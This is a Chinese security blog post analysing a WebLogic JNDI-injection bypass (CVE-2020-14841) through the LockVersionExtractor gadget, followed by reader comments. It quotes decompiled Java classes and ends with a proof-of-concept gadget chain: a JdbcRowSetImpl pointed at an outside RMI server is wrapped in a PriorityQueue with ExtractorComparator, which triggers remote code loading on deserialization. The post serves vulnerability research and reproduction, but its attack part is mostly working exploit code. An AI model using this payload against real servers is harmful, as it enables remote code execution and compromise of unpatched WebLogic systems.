\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/qs783sbJSOHgGi8pbpExIA)

简介
--

通过diff 升级包中weblogic的黑名单，我们发现新增`oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor`这个类

LockVersionExtractor 分析
-----------------------

```
package oracle.eclipselink.coherence.integrated.internal.cache;  
  
  
import com.tangosol.io.ExternalizableLite;  
import com.tangosol.io.pof.PofReader;  
import com.tangosol.io.pof.PofWriter;  
import com.tangosol.io.pof.PortableObject;  
import com.tangosol.util.ExternalizableHelper;  
import com.tangosol.util.ValueExtractor;  
import java.io.DataInput;  
import java.io.DataOutput;  
import java.io.IOException;  
import oracle.eclipselink.coherence.integrated.cache.Wrapper;  
import oracle.eclipselink.coherence.integrated.internal.querying.EclipseLinkExtractor;  
import org.eclipse.persistence.mappings.AttributeAccessor;  
  
  
public class LockVersionExtractor implements ValueExtractor, ExternalizableLite, PortableObject, EclipseLinkExtractor {  
    protected AttributeAccessor accessor;  
    protected String className;  
  
  
    public LockVersionExtractor() {  
    }  
  
  
    public LockVersionExtractor(AttributeAccessor accessor, String className) {  
        this.accessor = accessor;  
        this.className = className;  
    }  
  
  
    public Object extract(Object arg0) {  
        if (arg0 == null) {  
            return null;  
        } else {  
            if (arg0 instanceof Wrapper) {  
                arg0 = ((Wrapper)arg0).unwrap();  
            }  
  
  
            if (!this.accessor.isInitialized()) {  
                this.accessor.initializeAttributes(arg0.getClass());  
            }  
  
  
            return this.accessor.getAttributeValueFromObject(arg0);  
        }  
    }  
  
  

```

我们可以从代码上看出来，类似与 cve-2020-2555，用法也都是一样的。触发漏洞的重点在于this.accessor.getAttributeValueFromObject 中。下面选取一个可能的执行路径

```
package org.eclipse.persistence.internal.descriptors;  
  
  
public class MethodAttributeAccessor extends AttributeAccessor {  
    protected String setMethodName = "";  
    protected String getMethodName;  
    protected transient Method setMethod;  
    protected transient Method getMethod;  
  
    public Object getAttributeValueFromObject(Object anObject) throws DescriptorException {  
        return this.getAttributeValueFromObject(anObject, (Object[])null);  
    }  
  
    protected Object getAttributeValueFromObject(Object anObject, Object[] parameters) throws DescriptorException {  
        try {  
            if (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) {  
                try {  
                    return AccessController.doPrivileged(new PrivilegedMethodInvoker(this.getGetMethod(), anObject, parameters));  
                } catch (PrivilegedActionException var5) {  
                    Exception throwableException = var5.getException();  
                    if (throwableException instanceof IllegalAccessException) {  
                        throw DescriptorException.illegalAccessWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException);  
                    } else {  
                        throw DescriptorException.targetInvocationWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException);  
                    }  
                }  
            } else {  
                return this.getMethod.invoke(anObject, parameters);  
            }  
  

```

MethodAttributeAccessor中getAttributeValueFromObject函数缺点在于，只能执行无参的函数，从这点来看，我们很容易的与七月份 cve-2020-14645 联想起来

所以照猫画虎 poc如下

POC
---

```
 // JdbcRowSetImpl  
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();  
        jdbcRowSet.setDataSourceName("rmi://192.168.3.254:8888/xsmd");  
  
        MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();  
        methodAttributeAccessor.setGetMethodName("getDatabaseMetaData");  
        methodAttributeAccessor.setIsWriteOnly(true);  
        methodAttributeAccessor.setAttributeName("UnicodeSec");  
  
  
        LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, "UnicodeSec");  
  
        final ExtractorComparator comparator = new ExtractorComparator(extractor);  
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);  
  
  
        Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};  
        Reflections.setFieldValue(queue, "queue", q);  
        Reflections.setFieldValue(queue, "size", 2);  
  
        Field comparatorF = queue.getClass().getDeclaredField("comparator");  
        comparatorF.setAccessible(true);  
        comparatorF.set(queue, new ExtractorComparator(extractor));
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

宽字节安全 发起了一个读者讨论 cve 2020-14841 weblogic jndi注入绕过分析复现 附POC 精选讨论内容

![](http://wx.qlogo.cn/mmhead/PiajxSqBRaEL6sNgaM2B7S3e8sehp267g6iaCLzabZ4GlAhbibcSJSTfg/132)

adh

嫖

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6PtszGgUMIdQQHHrrvrePgsy1WAa1pZQlIiaWbolNfkJQ/132)

明

为啥只能执行无参函数?? 每天理解 大佬求解

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM4JojGpq3xGOhATbKnanpibuib7qKce6rPovdRUHu9iaETkQ/132)

等！

求exp

余下1条讨论内容